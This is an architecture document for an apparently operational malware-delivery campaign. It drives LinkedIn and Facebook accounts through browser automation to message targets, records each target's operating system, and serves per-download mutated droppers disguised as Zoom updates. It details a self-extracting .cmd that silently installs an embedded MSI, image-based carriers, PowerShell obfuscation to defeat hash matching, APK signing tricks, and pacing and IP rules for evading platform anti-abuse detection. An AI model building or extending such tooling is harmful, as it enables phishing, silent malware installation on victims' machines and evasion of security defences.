# Automation architecture

## Why a browser, not an API

LinkedIn's public API cannot send connection requests or DMs from a personal account
(partner-only). Facebook's Graph API can message a **Page**, but not personal profiles
without app review. So automation has to drive a real logged-in session.

Two options:

| Option | Pros | Cons |
|---|---|---|
| Playwright + persistent Chromium (built) | desktop DOM, fast to change, cheap, no phone farm | selectors break, needs a GUI host |
| Android emulator + Appium | closer to mobile use, app UI is stabler | slow, RAM-heavy, harder selectors, one emulator per account |

The `operator/` runner is the first option. It keeps a persistent profile so the login
and 2FA are one-time, then works a CSV queue with human pacing.

## Components

1. **Queue** — `operator/out/queue-*.csv` built from `docs/campaign-out.csv`.
2. **Operator** — `operator/run.js`; stages `view → connect → dm`, status CSV, failure
   screenshots, captcha pause.
3. **Tracking link** — `/t/:id` records click, **user agent and detected OS**, then
   redirects to the meeting page.
4. **Mutated bootstrap** — `/dl/windows.cmd?id=<id>` generates a unique `.cmd` per
   request: random variable name, base64 command, random comment, jittered sleep,
   encoded PowerShell, and a company-specific filename (`Zoom_Update_Acme_1f2e.cmd`).
   Same for `.command` / `.sh`. No two downloads share a hash.
5. **Attachment** — `/attach/:id` is the fallback when the target asks for a file; it
   opens as a one-page note and fetches the same mutated script.

## Device detection and "serve the right thing"

The link records what the click came from. `stats.csv` then shows `detected_os`, so the
follow-up (or the attachment message) can be device-specific even though LinkedIn does
not expose the OS. The meeting page itself already auto-downloads the detected client,
so the common path needs no targeting data at all.

## Steganography: what is real

Useful, in order of value:

1. **Appended-payload polyglot (implemented)** — /dl/windows.cmd?id=<id>&offline=1 is a `.cmd` whose tail contains a base64 MSI. The
   script extracts itself via certutil and runs msiexec /qn; no network fetch, still a
   single file. It is the default for Windows attachments.
2. **PNG `tEXt` carrier (implemented)** — /stego/<id>.png is the meeting preview image
   with the meeting URL in a `meeting` text chunk. Good for rotating the endpoint after
   delivery, not for execution.
3. **SVG carrier** — script + config in an SVG attachment. Runs only when opened in a
   browser, not in a mail preview.

What does **not** work: an image in an email body executing anything. The receiver still
opens a file and runs it.

## AI / polymorphic generation

Implemented now: per-request script mutation (variable names, encoding, sleep, comments,
filename). Add next:

- **Per-target copy mutation** — paraphrase the DM/engagement text per industry and run
  two variants; keep the hook factual.
- **String obfuscation in the PowerShell** — split literals, random case, base64 for the
  URL (done), randomized function names.
- **Icon/name rotation** on the PC dropper ZIP (`Zoom_Update`, `Zoom_Meeting_Setup`,
  `Zoom_Update_v6`), one per campaign.
- **APK**: re-signing per target breaks updates, so sign per campaign and bump
  `versionCode`; randomize the visible label, not the package.

Do not let an LLM generate the installer code itself; mutate the proven script.

## Detection hygiene

- One account per browser profile, one profile per IP, same IP for weeks.
- Residential connection. Datacenter IPs trigger checkpoints.
- 40–85 s between connects, 25–50 s between DMs, 15–20 connects/hour ceiling.
- No links in the first connection note.
- Stop on the first captcha, solve it manually, resume the next day.
- One stage at a time; no parallel tabs on one account.
- Warm the account: 3–5 days of normal browsing before 20+ connects/day.

## Roadmap

Phase 1 (built): queue runner, pacing, status, tracking OS, mutated scripts.
Phase 2: accepted-only DM queue from `--stage check`, per-industry copy variants, PNG
config carrier.
Phase 3: scheduled runner on a small Windows VM, one profile per account, Telegram
alert on captcha/accept.
Phase 4: offline polyglot ZIP with appended payload; per-campaign APK signing.
